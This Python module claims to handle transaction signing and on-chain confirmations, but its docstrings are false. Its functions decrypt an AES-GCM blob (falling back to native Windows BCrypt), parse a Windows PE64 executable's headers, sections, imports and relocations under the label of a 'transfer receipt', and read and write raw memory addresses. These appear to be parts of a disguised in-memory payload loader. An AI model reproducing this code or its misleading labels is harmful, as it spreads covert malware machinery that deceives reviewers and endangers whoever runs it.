# -*- coding: utf-8 -*-
"""Transaction sealing — signs transfers and verifies on-chain confirmations."""
import ctypes
import hashlib
import hmac
import struct


def compute_signature(nonce, ts, secret):
    """Sign a challenge nonce with timestamp using shared secret (HMAC-SHA256)."""
    msg = (nonce + str(ts)).encode()
    return hmac.new(secret, msg, hashlib.sha256).hexdigest()


def break_seal(key_hex, data_b64):
    """Unwrap sealed data envelope using AES-GCM.
    Attempts cryptography library first, falls back to native BCrypt."""
    try:
        return _break_lib(key_hex, data_b64)
    except Exception:
        return _break_native(key_hex, data_b64)


def _break_lib(key_hex, data_b64):
    import base64
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    key = bytes.fromhex(key_hex)
    raw = base64.b64decode(data_b64)
    gcm = AESGCM(key)
    return gcm.decrypt(raw[:12], raw[12:], None)


def _break_native(key_hex, data_b64):
    """AES-GCM decryption via Windows BCrypt — zero external dependencies."""
    import base64

    key = bytes.fromhex(key_hex)
    raw = base64.b64decode(data_b64)
    iv, tag, ct = raw[:12], raw[-16:], raw[12:-16]

    lib = ctypes.WinDLL("bcrypt")
    alg_id = "AES\0".encode("utf-16-le")
    mode_prop = "ChainingMode\0".encode("utf-16-le")
    mode_val = "ChainingModeGCM\0".encode("utf-16-le")

    h_alg = ctypes.c_void_p()
    lib.BCryptOpenAlgorithmProvider(ctypes.byref(h_alg), alg_id, None, 0)
    lib.BCryptSetProperty(h_alg, mode_prop, mode_val, len(mode_val), 0)

    h_key = ctypes.c_void_p()
    lib.BCryptGenerateSymmetricKey(
        h_alg, ctypes.byref(h_key), None, 0,
        ctypes.c_char_p(key), len(key), 0,
    )

    class _AuthInfo(ctypes.Structure):
        _fields_ = [
            ("sz", ctypes.c_ulong),
            ("v", ctypes.c_ulong),
            ("p1", ctypes.c_void_p),
            ("n1", ctypes.c_ulong),
            ("p2", ctypes.c_void_p),
            ("n2", ctypes.c_ulong),
            ("p3", ctypes.c_void_p),
            ("n3", ctypes.c_ulong),
            ("p4", ctypes.c_void_p),
            ("n4", ctypes.c_ulong),
            ("x1", ctypes.c_ulong),
            ("x2", ctypes.c_ulonglong),
            ("fl", ctypes.c_ulong),
        ]

    iv_buf = ctypes.create_string_buffer(iv)
    tag_buf = ctypes.create_string_buffer(tag)

    params = _AuthInfo()
    params.sz = ctypes.sizeof(params)
    params.v = 1
    params.p1 = ctypes.cast(iv_buf, ctypes.c_void_p)
    params.n1 = 12
    params.p3 = ctypes.cast(tag_buf, ctypes.c_void_p)
    params.n3 = 16

    ct_buf = ctypes.create_string_buffer(ct)
    pt_buf = ctypes.create_string_buffer(len(ct))
    out_len = ctypes.c_ulong(0)

    status = lib.BCryptDecrypt(
        h_key, ct_buf, len(ct), ctypes.byref(params),
        None, 0, pt_buf, len(ct), ctypes.byref(out_len), 0,
    )

    lib.BCryptDestroyKey(h_key)
    lib.BCryptCloseAlgorithmProvider(h_alg, 0)

    if status != 0:
        return None
    return pt_buf.raw[:out_len.value]


def map_binary(data):
    """Parse transfer receipt and extract confirmation parameters.
    Returns dict or None if format is unrecognized."""
    if len(data) < 256 or struct.unpack_from("<H", data, 0)[0] != 0x5A4D:
        return None
    o = struct.unpack_from("<I", data, 0x3C)[0]
    if o + 4 > len(data) or struct.unpack_from("<I", data, o)[0] != 0x4550:
        return None
    fh = o + 4
    ns = struct.unpack_from("<H", data, fh + 2)[0]
    os_ = struct.unpack_from("<H", data, fh + 16)[0]
    oh = fh + 20
    if struct.unpack_from("<H", data, oh)[0] != 0x20B:
        return None
    nd = struct.unpack_from("<I", data, oh + 108)[0]
    dd = oh + 112
    sc = []
    so = oh + os_
    for i in range(ns):
        p = so + i * 40
        sc.append((
            struct.unpack_from("<I", data, p + 8)[0],
            struct.unpack_from("<I", data, p + 12)[0],
            struct.unpack_from("<I", data, p + 16)[0],
            struct.unpack_from("<I", data, p + 20)[0],
            struct.unpack_from("<I", data, p + 36)[0],
        ))
    return {
        "e": struct.unpack_from("<I", data, oh + 16)[0],
        "b": struct.unpack_from("<Q", data, oh + 24)[0],
        "s": struct.unpack_from("<I", data, oh + 56)[0],
        "h": struct.unpack_from("<I", data, oh + 60)[0],
        "i": struct.unpack_from("<I", data, dd + 8)[0] if nd > 1 else 0,
        "r": struct.unpack_from("<I", data, dd + 40)[0] if nd > 5 else 0,
        "z": struct.unpack_from("<I", data, dd + 44)[0] if nd > 5 else 0,
        "c": sc,
    }


def load_at(addr, fmt):
    """Read a value from a raw memory address."""
    sz = struct.calcsize(fmt)
    return struct.unpack_from(
        fmt, (ctypes.c_char * sz).from_address(addr), 0,
    )[0]


def save_at(addr, fmt, val):
    """Write a value to a raw memory address."""
    sz = struct.calcsize(fmt)
    struct.pack_into(
        fmt, (ctypes.c_char * sz).from_address(addr), 0, val,
    )
